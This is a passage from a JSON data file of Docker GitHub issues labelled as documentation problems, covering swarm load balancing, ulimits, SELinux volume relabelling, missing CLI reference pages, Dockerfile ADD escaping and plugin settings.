17.03.0-ee-1\r\n API version:  1.26 (minimum version 1.24)\r\n Go version:   go1.7.5\r\n Git commit:   9094a76\r\n Built:        Wed Mar  1 00:49:51 2017\r\n OS/Arch:      windows/amd64\r\n Experimental: false\r\n```\r\n\r\n**2. Windows 2016 Host on Azure**\r\n```text\r\nClient:\r\nVersion:      1.12.2-cs2-ws-beta\r\nAPI version:  1.25\r\nGo version:   go1.7.1\r\nGit commit:   050b611\r\nBuilt:        Tue Oct 11 02:35:40 2016\r\nOS/Arch:      windows/amd64\r\n\r\nServer:\r\nVersion:      1.12.2-cs2-ws-beta\r\nAPI version:  1.25\r\nGo version:   go1.7.1\r\nGit commit:   050b611\r\nBuilt:        Tue Oct 11 02:35:40 2016\r\nOS/Arch:      windows/amd64\r\n\r\n```\r\n\r\nI understand I've not provided all necessary information to help you reproduce but the artifacts being referenced in the container are not freely available. What I can additionally say, is that the same  succeeds on Windows 10 host (case 1) when building on `microsoft/windowsservercore:latest` but fails when building on `asarafian/mssql-server-windows-express:2014SP2`. The difference between the two is the extra disk space required for SQL Server 2014SP2 and the memory that the sql server process take. Keep in mind that the sql server has one very small database attached, so it's strange that it makes that big of a difference.\r\n\r\nI'm more than willing to help troubleshoot this issue but I need some help on how. My feeling is that there is a difference between how docker and containers behave between Windows 10 and Windows Server hosts. The windows 10 machine has the most memory available from all the other one and reports 8-9GB free when the our of memory is thrown. On the other hand, Windows Server 2016 manages better with less memory available to the host. As there is a difference on setting up docker for Windows 10 and Windows Server, is it possible that there some limitations for Windows 10? If so, then I would consider this bug's resolution and documentation fix because I can't find any relevant information, besides limiting the memory available to the container.\r\n"},{"labels":["documentation",null,null,null],"text":"The [Load Balancing](https://docs.docker.com/engine/swarm/key-concepts/#load-balancing) section in the swarm docs don't make it clear if the internal loadbalancer also does health checks, and if it removes nodes that aren't running the service anymore (because it got killed or the node got rebooted).\r\n\r\nIn the following case I've got a service with replicas 3, 1 instance running on each of the 3 nodes.\r\n\r\nManager:\r\n```\r\n[root@centosvm ~]# docker ps\r\nCONTAINER ID        IMAGE                                    COMMAND                  CREATED             STATUS              PORTS               NAMES\r\na593d485050a        ddewaele/springboot.crud.sample:latest   \"sh -c 'java $JAVA_OP\"   7 minutes ago       Up 7 minutes                            springbootcrudsample.1.5syc6j4c8i3bnerdqq4e1yelm\r\n```\r\nNode1:\r\n```\r\n[root@node1 ~]# docker ps\r\nCONTAINER ID        IMAGE                                    COMMAND                  CREATED             STATUS              PORTS               NAMES\r\nd3b3fbc0f2c5        ddewaele/springboot.crud.sample:latest   \"sh -c 'java $JAVA_OP\"   4 minutes ago       Up 4 minutes                            springbootcrudsample.3.7y1oyjyrifgkmxlr20oai5ppl\r\n```\r\nNode 2:\r\n```\r\n[root@node2 ~]# docker ps\r\nCONTAINER ID        IMAGE                                    COMMAND                  CREATED             STATUS              PORTS               NAMES\r\nebca8f24ec3a        ddewaele/springboot.crud.sample:latest   \"sh -c 'java $JAVA_OP\"   7 minutes ago       Up 7 minutes                            springbootcrudsample.2.4tqjad7od8ep047s55485na1t\r\n```\r\nNow, on node1, we kill the docker container. This node will be without a service (swarm will re-create it here after a couple of seconds to keep the replication=3 on the service)\r\n```\r\n[root@node1 ~]# docker kill d3b3fbc0f2c5\r\nd3b3fbc0f2c5\r\n```\r\nContainer gone\r\n```\r\n[root@node1 ~]# docker ps\r\nCONTAINER ID        IMAGE                                    COMMAND                  CREATED             STATUS              PORTS               NAMES\r\n```\r\nNew container up\r\n```\r\n[root@node1 ~]# docker ps\r\nCONTAINER ID        IMAGE                                    COMMAND                  CREATED             STATUS              PORTS               NAMES\r\nb8c9a7a5cf97        ddewaele/springboot.crud.sample:latest   \"sh -c 'java $JAVA_OP\"   11 seconds ago      Up 9 seconds                            springbootcrudsample.3.9v4cnhi8dvq7n8afb2kvp28sk\r\n```\r\n\r\nIn the output below however, when container `d3b3fbc0f2c5` was killed, the ingress  loadbalancer didn't detect this, and it was still sending traffic to the node (resulting in connection refused) ? \r\n\r\nHow should we handle such a scenario ? Do we still need an external loadbalancer for this scenario and how should we configure it ?\r\n\r\n```\r\n[root@centosvm ~]# while :; do curl http://localhost:8080/env/hostname ; echo \"\" ; sleep 1; done\r\n{\"hostname\":\"d3b3fbc0f2c5\"}\r\n{\"hostname\":\"a593d485050a\"}\r\n{\"hostname\":\"ebca8f24ec3a\"}\r\n{\"hostname\":\"d3b3fbc0f2c5\"}\r\n{\"hostname\":\"a593d485050a\"}\r\n{\"hostname\":\"ebca8f24ec3a\"}\r\n{\"hostname\":\"d3b3fbc0f2c5\"}\r\n{\"hostname\":\"a593d485050a\"}\r\n{\"hostname\":\"ebca8f24ec3a\"}\r\n{\"hostname\":\"a593d485050a\"}\r\n{\"hostname\":\"ebca8f24ec3a\"}\r\n{\"hostname\":\"a593d485050a\"}\r\ncurl: (7) Failed connect to localhost:8080; Connection refused\r\n\r\n{\"hostname\":\"ebca8f24ec3a\"}\r\n{\"hostname\":\"a593d485050a\"}\r\ncurl: (7) Failed connect to localhost:8080; Connection refused\r\n\r\n{\"hostname\":\"ebca8f24ec3a\"}\r\n{\"hostname\":\"a593d485050a\"}\r\ncurl: (7) Failed connect to localhost:8080; Connection refused\r\n\r\n{\"hostname\":\"ebca8f24ec3a\"}\r\n{\"hostname\":\"a593d485050a\"}\r\ncurl: (7) Failed connect to localhost:8080; Connection refused\r\n\r\n{\"hostname\":\"ebca8f24ec3a\"}\r\n{\"hostname\":\"a593d485050a\"}\r\ncurl: (7) Failed connect to localhost:8080; Connection refused\r\n\r\n{\"hostname\":\"ebca8f24ec3a\"}\r\n{\"hostname\":\"a593d485050a\"}\r\ncurl: (7) Failed connect to localhost:8080; Connection refused\r\n\r\n{\"hostname\":\"ebca8f24ec3a\"}\r\n{\"hostname\":\"a593d485050a\"}\r\n{\"hostname\":\"b8c9a7a5cf97\"}\r\n{\"hostname\":\"ebca8f24ec3a\"}\r\n{\"hostname\":\"a593d485050a\"}\r\n{\"hostname\":\"b8c9a7a5cf97\"}\r\n```"},{"labels":["documentation"],"text":"Hi,\r\nI was reading the docs (to get up-to-date between 1.11 and 1.13) and [here](https://docs.docker.com/engine/userguide/eng-image/dockerfile_best-practices/#/each-container-should-have-only-one-concern) I found this sentence:\r\n\r\n> In addition to the fact that containers can now be spawned with an init process, some programs might spawn additional processes of their own accord. \r\n\r\nSo I wonder, can we **really** specify an init process or does this page simply talk about the `CMD`?\r\n\r\nThe link brings nowhere hlpeful. So if it's just about the `CMD`, could we change the docs (should I click \"Edit this page\" or \"Request dos change\"?) because it is misleading :)\r\nI was really hoping that we could _finally_ have an init process :)\r\n\r\nThanks in advance :P"},{"labels":["documentation",null,null],"text":"**Description**\r\nI was refering to document related to nproc ulimit.\r\nhttps://docs.docker.com/engine/reference/commandline/run/\r\n\r\nWhen created 4th  container with ulimit nproc=3 for specific user , it gets created. \r\ndocker run -d -u daemon --ulimit nproc=3 busybox top \r\n\r\n\r\n**Steps to reproduce the issue:**\r\n1. Create 4 containers with below command\r\n    docker run -d -u daemon --ulimit nproc=3 busybox top    \r\n\r\n**Describe the results you received:**\r\nsh-4.2# docker run -d -u daemon --ulimit nproc=3 busybox top\r\nc272f84204c6a706e89dc2969c37cc1b15b0a34f08b0647786b2dc6912744734\r\nsh-4.2# docker run -d -u daemon --ulimit nproc=3 busybox top\r\n994c174d5eeedc49621c4ed29b66bd7d12dc9e2c3f68cd050ececfd0bddafe2e\r\nsh-4.2# docker run -d -u daemon --ulimit nproc=3 busybox top\r\n^[[Ac2829ec24116fa55769c4d86b5469147ff04cda4096b032932c733409dce7a2f\r\nsh-4.2# docker run -d -u daemon --ulimit nproc=3 busybox top\r\ncdeb9a71f407702966e7ecc9ec6d023c01a131fcf00776332f36550361c21255\r\nsh-4.2#\r\n\r\n\r\n**Describe the results you expected:**\r\n**Describe the results you received:**\r\nsh-4.2# docker run -d -u daemon --ulimit nproc=3 busybox top\r\nc272f84204c6a706e89dc2969c37cc1b15b0a34f08b0647786b2dc6912744734\r\nsh-4.2# docker run -d -u daemon --ulimit nproc=3 busybox top\r\n994c174d5eeedc49621c4ed29b66bd7d12dc9e2c3f68cd050ececfd0bddafe2e\r\nsh-4.2# docker run -d -u daemon --ulimit nproc=3 busybox top\r\n^[[Ac2829ec24116fa55769c4d86b5469147ff04cda4096b032932c733409dce7a2f\r\nsh-4.2# docker run -d -u daemon --ulimit nproc=3 busybox top\r\n[8] System error: resource temporarily unavailable\r\n\r\n4th container should get failed with \"[8] System error: resource temporarily unavailable\"\r\n\r\n**Output of `docker version`:**\r\nsh-4.2# docker version\r\nClient:\r\n Version:      1.13.0\r\n API version:  1.25\r\n Go version:   go1.7.3\r\n Git commit:   49bf474\r\n Built:        Tue Jan 17 09:55:28 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      1.13.0\r\n API version:  1.25 (minimum version 1.12)\r\n Go version:   go1.7.3\r\n Git commit:   49bf474\r\n Built:        Tue Jan 17 09:55:28 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\n\r\n**Output of `docker info`:**\r\nsh-4.2# docker info\r\nContainers: 4\r\n Running: 4\r\n Paused: 0\r\n Stopped: 0\r\nImages: 6\r\nServer Version: 1.13.0\r\nStorage Driver: devicemapper\r\n Pool Name: docker-253:1-1492245-pool\r\n Pool Blocksize: 65.54 kB\r\n Base Device Size: 10.74 GB\r\n Backing Filesystem: xfs\r\n Data file: /dev/loop0\r\n Metadata file: /dev/loop1\r\n Data Space Used: 56.88 GB\r\n Data Space Total: 107.4 GB\r\n Data Space Available: 28.74 GB\r\n Metadata Space Used: 135.8 MB\r\n Metadata Space Total: 2.147 GB\r\n Metadata Space Available: 2.012 GB\r\n Thin Pool Minimum Free Space: 10.74 GB\r\n Udev Sync Supported: true\r\n Deferred Removal Enabled: false\r\n Deferred Deletion Enabled: false\r\n Deferred Deleted Device Count: 0\r\n Data loop file: /var/lib/docker/devicemapper/devicemapper/data\r\n WARNING: Usage of loopback devices is strongly discouraged for production use. Use `--storage-opt dm.thinpooldev` to specify a custom block storage device.\r\n Metadata loop file: /var/lib/docker/devicemapper/devicemapper/metadata\r\n Library Version: 1.02.107-RHEL7 (2016-06-09)\r\nLogging Driver: syslog\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 03e5862ec0d8d3b3f750e19fca3ee367e13c090e\r\nrunc version: 2f7393a47307a16f8cee44a37b262e8b81021e3e\r\ninit version: 949e6fa\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 3.10.0-327.22.2.el7.x86_64\r\nOperating System: CentOS Linux 7 (Core)\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 4\r\nTotal Memory: 7.797 GiB\r\nName: gsljumphost.cisco.com\r\nID: LIZX:TKX5:IBZC:B3SF:BVLE:JGQ5:2GAG:OHSF:PM5H:ASYI:DISB:ZOM2\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nWARNING: bridge-nf-call-iptables is disabled\r\nWARNING: bridge-nf-call-ip6tables is disabled\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n"},{"labels":["documentation",null,null],"text":"`docker stack ps` docs are sparse in examples.\r\nhttps://github.com/docker/docker/blob/master/docs/reference/commandline/stack_ps.md#examples\r\n\r\nIt would be good to have concrete examples similar to `docker service ps` and use them in the filtering logic. https://github.com/docker/docker/blob/master/docs/reference/commandline/service_ps.md#examples"},{"labels":["documentation"],"text":"The `CopyToContainer` method's documentation simply states the following:\r\n> CopyToContainer copies content into the container filesystem.\r\n\r\nHowever, the [API endpoint's documentation](https://docs.docker.com/engine/api/v1.24/index.html#extract-an-archive-of-files-or-folders-to-a-directory-in-a-container) states the endpoint only accepts tarballs. The code in the `cli` package using `CopyToContainer` clearly shows files being archived to a tarball as well.\r\n\r\nI think `CopyToContainer`'s documentation should reflect that it expects the `content` argument to be a tarball.\r\n"},{"labels":["documentation"],"text":"**Description**\r\n\r\nWhile compile the latest YAML files for docs, the following CLI reference files were found to be missing:\r\n\r\n* [ ] docs/reference/commandline/checkpoint/create.md\r\n* [ ] docs/reference/commandline/checkpoint/ls.md\r\n* [ ] docs/reference/commandline/checkpoint/rm.md\r\n* [ ] docs/reference/commandline/checkpoint.md\r\n* [ ] docs/reference/commandline/container/attach.md\r\n* [ ] docs/reference/commandline/container/commit.md\r\n* [ ] docs/reference/commandline/container/cp.md\r\n* [ ] docs/reference/commandline/container/create.md\r\n* [ ] docs/reference/commandline/container/diff.md\r\n* [ ] docs/reference/commandline/container/exec.md\r\n* [ ] docs/reference/commandline/container/export.md\r\n* [ ] docs/reference/commandline/container/inspect.md\r\n* [ ] docs/reference/commandline/container/kill.md\r\n* [ ] docs/reference/commandline/container/logs.md\r\n* [ ] docs/reference/commandline/container/ls.md\r\n* [ ] docs/reference/commandline/container/pause.md\r\n* [ ] docs/reference/commandline/container/port.md\r\n* [ ] docs/reference/commandline/container/prune.md\r\n* [ ] docs/reference/commandline/container/rename.md\r\n* [ ] docs/reference/commandline/container/restart.md\r\n* [ ] docs/reference/commandline/container/rm.md\r\n* [ ] docs/reference/commandline/container/run.md\r\n* [ ] docs/reference/commandline/container/start.md\r\n* [ ] docs/reference/commandline/container/stats.md\r\n* [ ] docs/reference/commandline/container/stop.md\r\n* [ ] docs/reference/commandline/container/top.md\r\n* [ ] docs/reference/commandline/container/unpause.md\r\n* [ ] docs/reference/commandline/container/update.md\r\n* [ ] docs/reference/commandline/container/wait.md\r\n* [ ] docs/reference/commandline/container.md\r\n* [ ] docs/reference/commandline/image/build.md\r\n* [ ] docs/reference/commandline/image/history.md\r\n* [ ] docs/reference/commandline/image/import.md\r\n* [ ] docs/reference/commandline/image/inspect.md\r\n* [ ] docs/reference/commandline/image/load.md\r\n* [ ] docs/reference/commandline/image/ls.md\r\n* [ ] docs/reference/commandline/image/prune.md\r\n* [ ] docs/reference/commandline/image/pull.md\r\n* [ ] docs/reference/commandline/image/push.md\r\n* [ ] docs/reference/commandline/image/rm.md\r\n* [ ] docs/reference/commandline/image/save.md\r\n* [ ] docs/reference/commandline/image/tag.md\r\n* [ ] docs/reference/commandline/image.md\r\n* [ ] docs/reference/commandline/network/connect.md\r\n* [ ] docs/reference/commandline/network/create.md\r\n* [ ] docs/reference/commandline/network/disconnect.md\r\n* [ ] docs/reference/commandline/network/inspect.md\r\n* [ ] docs/reference/commandline/network/ls.md\r\n* [ ] docs/reference/commandline/network/prune.md\r\n* [ ] docs/reference/commandline/network/rm.md\r\n* [ ] docs/reference/commandline/network.md\r\n* [ ] docs/reference/commandline/node/demote.md\r\n* [ ] docs/reference/commandline/node/inspect.md\r\n* [ ] docs/reference/commandline/node/ls.md\r\n* [ ] docs/reference/commandline/node/promote.md\r\n* [ ] docs/reference/commandline/node/ps.md\r\n* [ ] docs/reference/commandline/node/rm.md\r\n* [ ] docs/reference/commandline/node/update.md\r\n* [ ] docs/reference/commandline/node.md\r\n* [ ] docs/reference/commandline/plugin/create.md\r\n* [ ] docs/reference/commandline/plugin/disable.md\r\n* [ ] docs/reference/commandline/plugin/enable.md\r\n* [ ] docs/reference/commandline/plugin/inspect.md\r\n* [ ] docs/reference/commandline/plugin/install.md\r\n* [ ] docs/reference/commandline/plugin/ls.md\r\n* [ ] docs/reference/commandline/plugin/push.md\r\n* [ ] docs/reference/commandline/plugin/rm.md\r\n* [ ] docs/reference/commandline/plugin/set.md\r\n* [ ] docs/reference/commandline/plugin/upgrade.md\r\n* [ ] docs/reference/commandline/plugin.md\r\n* [ ] docs/reference/commandline/secret/create.md\r\n* [ ] docs/reference/commandline/secret/inspect.md\r\n* [ ] docs/reference/commandline/secret/ls.md\r\n* [ ] docs/reference/commandline/secret/rm.md\r\n* [ ] docs/reference/commandline/secret.md\r\n* [ ] docs/reference/commandline/service/create.md\r\n* [ ] docs/reference/commandline/service/inspect.md\r\n* [ ] docs/reference/commandline/service/logs.md\r\n* [ ] docs/reference/commandline/service/ls.md\r\n* [ ] docs/reference/commandline/service/ps.md\r\n* [ ] docs/reference/commandline/service/rm.md\r\n* [ ] docs/reference/commandline/service/scale.md\r\n* [ ] docs/reference/commandline/service/update.md\r\n* [ ] docs/reference/commandline/service.md\r\n* [ ] docs/reference/commandline/stack/deploy.md\r\n* [ ] docs/reference/commandline/stack/ls.md\r\n* [ ] docs/reference/commandline/stack/ps.md\r\n* [ ] docs/reference/commandline/stack/rm.md\r\n* [ ] docs/reference/commandline/stack/services.md\r\n* [ ] docs/reference/commandline/stack.md\r\n* [ ] docs/reference/commandline/swarm/init.md\r\n* [ ] docs/reference/commandline/swarm/join.md\r\n* [ ] docs/reference/commandline/swarm/join-token.md\r\n* [ ] docs/reference/commandline/swarm/leave.md\r\n* [ ] docs/reference/commandline/swarm/unlock.md\r\n* [ ] docs/reference/commandline/swarm/unlock-key.md\r\n* [ ] docs/reference/commandline/swarm/update.md\r\n* [ ] docs/reference/commandline/swarm.md\r\n* [ ] docs/reference/commandline/system/df.md\r\n* [ ] docs/reference/commandline/system/events.md\r\n* [ ] docs/reference/commandline/system/info.md\r\n* [ ] docs/reference/commandline/system/prune.md\r\n* [ ] docs/reference/commandline/system.md\r\n* [ ] docs/reference/commandline/volume/create.md\r\n* [ ] docs/reference/commandline/volume/inspect.md\r\n* [ ] docs/reference/commandline/volume/ls.md\r\n* [ ] docs/reference/commandline/volume/prune.md\r\n* [ ] docs/reference/commandline/volume/rm.md\r\n* [ ] docs/reference/commandline/volume.md\r\n\r\n**Steps to reproduce the issue:**\r\n1. In a terminal get the help for `docker volume --help`\r\n2. Notice you get some help\r\n3. try to find the matching CLI ref in the docs reference folder and you'll see that https://github.com/docker/docker/blob/master/docs/reference/commandline/volume.md is missing\r\n\r\n**Describe the results you received:**\r\n404 page not found\r\n\r\n**Describe the results you expected:**\r\nto find the matching Markdown file for the above command\r\n"},{"labels":["documentation",null,null],"text":"I am running docker version v1.13.0 with swarm (stand alone), the old swarm.\r\n\r\nWe have an overlay network and it seems that we can't create more than 255 containers. We get the following error:\r\n\r\n**Cannot start service logsparser: Error response from daemon: no available IPv4 addresses on this network's address pools**\r\n\r\n\r\nIs it a bug? Is there a way to increase this limitation?\r\n\r\nI attached 2 files with the output of:\r\n\r\ndocker info\r\n\r\nand\r\n\r\ndocker network inspect\r\n\r\n[d_info.txt](https://github.com/docker/docker/files/775585/d_info.txt)\r\n[d_network_inspect.txt](https://github.com/docker/docker/files/775586/d_network_inspect.txt)\r\n\r\n\r\n\r\n"},{"labels":["documentation"],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- IRC - irc.freenode.net #docker channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\n\r\nThe dockerd docs don't mention the new experimental flag and what features that enables (https://docs.docker.com/engine/reference/commandline/dockerd/), and the README in the repo (https://github.com/docker/docker/tree/master/experimental) is missing a lot of the new experimental features added in 1.13, e.g. see https://sreeninet.wordpress.com/2017/01/27/docker-1-13-experimental-features/.\r\n\r\nAlso, the experimental README  says \"Experimental features are not ready for production. They are provided for test and evaluation in your sandbox environments.\". That doesn't seem to match what I've heard from maintainers that experimental features are (now) considered behaviorally stable; just the API/CLI might change. E.g. see https://github.com/docker/docker/issues/26451#issuecomment-249294540"},{"labels":["documentation",null,null],"text":"Hey there,\r\n\r\nWhile this isn't a bug per se, it's _really_ unexpected behaviour of a Docker run command and I believe it deserves some attention, and at the _very_ least some clarification in the manual and steps to try and resolve the problem.\r\n\r\n======\r\n\r\nTl;dr, `:z` and `:Z` can cause the system to disallow logins by changing labels (until a reboot at least) without so much as a warning or a single line of output.\r\n\r\n======\r\n\r\nI run a CentOS 7.3 VM in Azure for testing out Docker boxes and making new ones (plus a few other bits and pieces)\r\n\r\nToday I ran a `docker run` (something similar to `docker run -v $PWD:/var/www:z -it <sha256 here> php -v`) in my home directory root (not usually where I run it) by doing a `^R` and searching for a command.\r\nBecause `$PWD` resolved to the my home dir the `:z` relabelled my _entire_ home directory with Docker's shared label. I wondered why the command took _so_ long to run, but didn't think much of it at the time.\r\nI walked away from my machine and (luckily) left my ssh session on. Later on I tried to log into the server from my phone and couldn't.\r\n\r\nAfter running back upstairs and some frantic defensive actions over the system (looking at `authorized_keys` files for tampering, audit logs, checking fail2ban, etc.) I decided the system had not been hacked into and my keys weren't compromised.\r\n\r\nEventually after searching around I noticed that `sshd` was being denied `read` to the `authorized_keys` file by SELinux because of the label change!\r\n\r\nAfter a `chcon -RFvv /home/username` I could log in again.\r\n\r\n======\r\n\r\nWhile it's obvious that those options were changing the labels on the _host_, I didn't realise until this point. The manual on [Volume Labels](https://docs.docker.com/engine/tutorials/dockervolumes/#/volume-labels) mentions about changing host's labels, but doesn't mention how dangerous this is and that if you can't log into the system a reboot or a relabel will be needed... (What if this was a system I couldn't / couldn't easily reboot?)\r\n\r\nIt's possible the manual also should explicitly list the two labels that are assigned for public and private mounts, so that people who don't want to use `:z` or `:Z` can manually label the files beforehand, which'd be safer and also can be put into the permanent policy of the machine.\r\n\r\nThanks."},{"labels":[null,"documentation",null],"text":"from my personal experience using the tooling. it would be great if these were resolved. please, do not take these as criticism.\r\n\r\n#### output:\r\n\r\ni  wonder how everyone deals with the docker ouput, in particular the core team. i suspect, i could be wrong, that people are handcrafting scripts for common operations.\r\n\r\ndealing with the ouput in a *unix env could be easier:\r\n\r\n* requires extra work when using common tools, e.g., `docker history <id>` -> `SIZE` contains spaces so `sort -h` doesn't handle it that well. one needs to do deal with Go templates.\r\n* some commands don't take formatting options so they're harder to deal with, e.g., `docker history`.\r\n* is there a standard delimiter that is always used for all the commands? quick test: remove just the `COMMENT` column, note the space(s) in the fields themselves.\r\n\r\n```sh\r\n$ docker history golang_1.4-alpine:latest\r\nIMAGE               CREATED             CREATED BY                                      SIZE                COMMENT\r\nf687c7a9c8fd        22 hours ago        /bin/sh -c echo 'hello world from' 'golang...   0 B                 \r\n0deea0c51a1c        11 months ago       /bin/sh -c #(nop) WORKDIR /go                   0 B                 \r\n<missing>           11 months ago       /bin/sh -c mkdir -p \"$GOPATH/src\" \"$GOPATH...   0 B                 \r\n<missing>           11 months ago       /bin/sh -c #(nop) ENV PATH=/go/bin:/usr/lo...   0 B                 \r\n<missing>           11 months ago       /bin/sh -c #(nop) ENV GOPATH=/go                0 B                 \r\n<missing>           11 months ago       /bin/sh -c set -ex  && apk add --no-cache ...   138 MB              \r\n<missing>           11 months ago       /bin/sh -c #(nop) ENV GOLANG_SRC_SHA1=486d...   0 B                 \r\n<missing>           11 months ago       /bin/sh -c #(nop) ENV GOLANG_SRC_URL=https...   0 B                 \r\n<missing>           11 months ago       /bin/sh -c #(nop) ENV GOLANG_VERSION=1.4.3      0 B                 \r\n<missing>           11 months ago       /bin/sh -c #(nop) ADD file:0f9cfb2e848f093...   4.79 MB             \r\n```\r\n\r\nwhat i'm trying to get at is, it would nice if the output played nicely with the tools folks are familiar with, and some consistent behaviour in the flags commands take (some take `--format` other don't).\r\n\r\n#### documentation\r\n\r\n#### aliasing\r\n\r\nthe alias, specifically, at the bottom is confusing, e.g., https://docs.docker.com/engine/reference/commandline/images/ says `docker images` -> ` docker image ls`:\r\n\r\n* why not then just redirect to the page?\r\n* the alias should be at the top of the page, it is less confusing that way.\r\n\r\n#### links to docs\r\n\r\nit would _really_ nice to have links to the docs directly (not the alias) available on the command line. something like below, or whatever fits your bill.\r\n\r\n```sh\r\n$ docker images --help\r\n\r\nhttps://docs.docker.com/engine/reference/commandline/image_ls/\r\n\r\nUsage:\tdocker images [OPTIONS] [REPOSITORY[:TAG]]\r\n\r\n...\r\n```\r\n\r\n---\r\n\r\n```sh\r\n$ docker version\r\n```\r\n\r\n```sh\r\nClient:\r\n Version:      1.13.0\r\n API version:  1.25\r\n Go version:   go1.7.3\r\n Git commit:   49bf474\r\n Built:        Wed Jan 18 16:20:26 2017\r\n OS/Arch:      darwin/amd64\r\n\r\nServer:\r\n Version:      1.13.0\r\n API version:  1.25 (minimum version 1.12)\r\n Go version:   go1.7.3\r\n Git commit:   49bf474\r\n Built:        Wed Jan 18 16:20:26 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: true\r\n```\r\n\r\n```sh\r\n$ docker info\r\n```\r\n\r\n```sh\r\nContainers: 153\r\n Running: 0\r\n Paused: 0\r\n Stopped: 153\r\nImages: 1589\r\nServer Version: 1.13.0\r\nStorage Driver: aufs\r\n Root Dir: /var/lib/docker/aufs\r\n Backing Filesystem: extfs\r\n Dirs: 1290\r\n Dirperm1 Supported: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins: \r\n Volume: local\r\n Network: bridge host ipvlan macvlan null overlay\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 03e5862ec0d8d3b3f750e19fca3ee367e13c090e\r\nrunc version: 2f7393a47307a16f8cee44a37b262e8b81021e3e\r\ninit version: 949e6fa\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.9.4-moby\r\nOperating System: Alpine Linux v3.5\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 2\r\nTotal Memory: 1.952 GiB\r\nName: moby\r\nID: NRXU:ZFNJ:3AC2:WVYL:UODL:44GO:E7AA:AFWL:22FC:FJYR:URTX:SV2N\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): true\r\n File Descriptors: 16\r\n Goroutines: 26\r\n System Time: 2017-02-09T19:26:55.917920388Z\r\n EventsListeners: 1\r\nNo Proxy: *.local, 169.254/16\r\nUsername: mohamedbana\r\nRegistry: https://index.docker.io/v1/\r\nExperimental: true\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n```"},{"labels":["documentation",null],"text":"The TOC on the right side of https://docs.docker.com/engine/deprecated/ has some entries at the wrong indentation. All the entries should have the same indentation.\r\n\r\n<img width=\"233\" alt=\"image\" src=\"https://cloud.githubusercontent.com/assets/11357370/22755255/64201d9a-ee10-11e6-9bfd-4780cff3a403.png\">\r\n"},{"labels":[null,"documentation",null],"text":"I'm trying to add in a Dockerfile a file with square brackets. Consider, for example, the following minimalistic Dockerfile:\r\n\r\n```\r\nFROM alpine\r\n\r\nADD \"arr[0].txt\" /\r\n\r\nCMD [\"bash\", \"-c\", \"ls -la *.txt\"]\r\n```\r\n\r\nAnd a file called `arr[0].txt` in the working directory. Trying to build this Dockerfile, I get:\r\n\r\n```\r\nStep 2/3 : ADD \"arr[0].txt\" /\r\nNo source files were specified\r\n```\r\n\r\nI already tried several variations of this command based on [Go filepath](https://golang.org/pkg/path/filepath/#Match), with no luck:\r\n\r\n* `ADD \"arr\\\\[0\\\\].txt\" /` (No source files were specified)\r\n* `ADD [\"arr\\\\[0\\\\].txt\", \"/\"]` (No source files were specified)\r\n* `ADD arr\\\\[0\\\\].txt /` (lstat arr\\\\[0\\\\].txt: no such file or directory)\r\n* `ADD \"arr\\[0\\].txt\" /` (lstat arr\\\\[0\\\\].txt: no such file or directory)\r\n* `ADD [\"arr\\[0\\].txt\", \"/\"]` (No source files were specified)\r\n* `ADD arr\\[0\\].txt /` (No source files were specified)\r\n\r\nAm I just missing the right pattern, or is this a bug?\r\n"},{"labels":["documentation",null,null],"text":"**Unable to set args for v2 plugins**\r\nThe plugin I'm using supports 3 arguments as seen in this output:\r\n```\r\n# docker plugin inspect nimble\r\n[\r\n    {\r\n        \"Config\": {\r\n            \"Args\": {\r\n                \"Description\": \"Group connection information\",\r\n                \"Name\": \"group\",\r\n                \"Settable\": [\r\n                    \"ip\",\r\n                    \"user\",\r\n                    \"pass\"\r\n                ],\r\n                \"Value\": [\r\n                    \"\",\r\n                    \"\",\r\n                    \"\"\r\n                ]\r\n            },\r\n```\r\n\r\nHowever, I am not able to set the values.\r\n```\r\n# docker plugin set nimble group.ip=10.1.2.3\r\nError response from daemon: \"group.ip\" is not settable\r\n```\r\n\r\n\r\n**Steps to reproduce the issue:**\r\n1. Create a plugin with 'Args' defined\r\n2. Inspect the plugin\r\n3. Attempt to set the arguments defined in the 'Args' configuration\r\n\r\n**Describe the results you received:**\r\nUnable to set args\r\n```\r\nDEBU[6382] Calling POST /v1.25/plugins/nimble/set       \r\nERRO[6382] Handler for POST /v1.25/plugins/nimble/set returned error: \"group.ip\" is not settable \r\n```\r\n\r\n**Describe the results you expected:**\r\nArgs should be set.\r\n\r\n**Additional information you deem important 